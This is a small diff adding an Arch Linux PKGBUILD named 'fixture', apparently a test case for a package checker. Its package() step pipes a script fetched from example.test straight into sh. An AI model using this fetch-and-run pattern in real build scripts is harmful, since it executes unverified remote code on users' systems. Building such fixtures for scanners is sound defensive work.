@@ -1,0 +1,8 @@
+pkgname=fixture
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+
+package() {
+  curl https://example.test/install.sh | sh
+}
